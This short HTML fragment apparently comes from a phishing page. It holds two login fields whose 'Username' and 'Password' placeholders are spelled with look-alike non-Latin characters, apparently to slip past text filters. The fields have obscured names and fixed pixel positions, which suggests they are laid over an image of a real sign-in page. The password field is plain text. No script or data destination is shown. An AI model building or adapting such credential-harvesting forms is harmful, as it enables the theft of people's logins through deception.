...
<input name="ud" placeholder="Usеrnаmе" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:321px;left:513px;top:194px;z-index:4">
<input name="pd" placeholder="Pаssѡоrd" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:321px;left:513px;top:254px;z-index:5">
